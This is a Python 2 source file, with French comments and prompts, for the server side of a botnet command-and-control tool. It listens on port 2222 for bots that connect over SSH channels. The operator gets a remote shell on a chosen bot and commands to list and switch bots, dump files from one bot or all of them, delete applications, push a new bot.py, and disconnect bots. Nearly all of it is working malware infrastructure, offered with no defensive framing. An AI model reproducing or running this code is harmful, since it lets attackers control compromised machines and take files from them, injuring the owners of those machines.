#--*-- coding:UTF-8 --*--

import socket
from client import  Client
import threading
import ChannelSSH
import random


class Myserver():

    def __init__(self):
        self.stop_server = False
        self.bots = {}
        self.obsoletebots = {}
        self.chan = {}
        self.sock = None
        self.connectedClients = None

    def end(self):
        try:
            self.garbage(self.bots)
            self.garbage(self.obsoletebots)
            self.sock.close()
        except Exception:
            pass
    def garbage(self,dict):
        for bot in dict.values():
            bot.close()
            dict.pop(bot.getAddr())

    def pop_bot(self):
        try:
            for bot in self.bots.values():
                if bot.isclosed():
                    self.bots.pop(bot.getAddr())
        except Exception:
            pass

    def lister_bots(self,dict):
        print "\nListe des bots.\n"
        print "Adresse IP du bot|"
        for key in dict.keys():
            print str(key)+"    |"

    def update(self):
        ChannelSSH.sendToChannel('update', self.chan)
        recv = ChannelSSH.receiveFromChannel(self.chan)
        if not 'OK!' in recv:
            print recv
            return

        with open('bot.py', 'r') as f:
            text = f.read()
        ChannelSSH.sendToChannel(text, self.chan)

    def  client_connection(self):
        self.sock.setblocking(0)
        while True:
            try:
                if self.stop_server:
                    continue1 = False
                    self.end()
                    break
                sc, addr = self.sock.accept()
                nvclient = Client(sc, addr)
                nvclient.connect()
                anclient = None
                self.chan = nvclient.get_channel()
                if len(self.bots) > 0:
                    anclient  = self.bots.get(addr[0])
                    if anclient is not None:
                        self.obsoletebots.update({addr[0]: anclient})
                self.bots.update({addr[0]: nvclient})
                nvclient.initialise_bot()
                self.pop_bot()
            except socket.error:
                pass

    def gestion_commande(self):
        while True:
            try:
                if self.bots:
                    command = raw_input("Shell, tapez quit pour arreter le serveur, help pour les renseignements sur les commandes\n$")
                    if command == '':
                        continue
                    if 'quit' in command:
                        self.stop_server = True
                        break
                    elif 'help' in command:
                        print "\nPar défaut on a un shell sur le dernièr bot connecté.\n"
                        print 'Liste des commandes : \n'
                        print "quit : pour quitter le serveur\n"
                        print "help : pour avoir l'aide\n"
                        print "list : pour avoir la liste des bots connecter\n"
                        print "switch : pour avoir un shell vers un autre bot de la liste, il faut entrer une ip parmi la liste des bots disponibles\n"
                        print "dump : Faire un dump de fichiers du bot courant.\n"
                        print "dumpall : Faire un dump de fichiers de tous les bots connectés.\n"
                        print "delete Nom_application : Supprimer une application à partir de son nom.\n"
                        print "update : Mis-à jou du bot à partir du nouveau.\n"
                        print "deconnect : pour déconnecter le bot courant\n\n"
                    elif command == 'switch':
                        IP = raw_input("Enter l'IP d'un bot parmi la liste : ")
                        if IP in self.bots.keys():
                            self.chan = self.bots[IP].get_channel()
                        else:
                            print "!! cette ip ne fait pas partie de la liste des bots disponibles.\n"
                    elif command == 'list':
                        self.lister_bots(self.bots)
                    elif command == 'update':
                        self.update()
                    elif command == 'dumpall':
                        print '[*] Starting Dumping files from all bots\n'
                        for bot  in self.bots.values():
                            if not bot.isclosed():
                                bot.dump()
                    elif 'deconnect' in command:
                        ChannelSSH.sendToChannel(command, self.chan)
                        for bot in self.bots.values():
                            if bot.get_channel() == self.chan:
                                bot.toclose()
                                self.obsoletebots.update({bot.getAddr(): bot})
                                self.bots.pop(bot.getAddr())
                        if len(self.bots) > 0:
                            ip, bot = random.choice(list(self.bots.items()))
                            print "\nswitching to randomly other channel "+ip
                            self.chan = bot.get_channel()
                        else:
                            print "la liste des bots connectés est vide, on se met en attente...\n"
                    else:
                        if command == 'dump':
                            print '[*] Starting Dumping files\n'
                        ChannelSSH.sendToChannel(command,self.chan)
                        print ChannelSSH.receiveFromChannel(self.chan)
            except Exception, e:
               print "[-] Gestion commande Terminated!" + str(e)


    def lancer(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind(("0.0.0.0", 2222))
            self.sock.listen(1)

            print '[+] Waiting for connection ...'
        except Exception, e:
            print '[-] Socket create and listen error: ' + str(e)

        threading.Thread(target=self.client_connection).start()
        threading.Thread(target=self.gestion_commande).start()













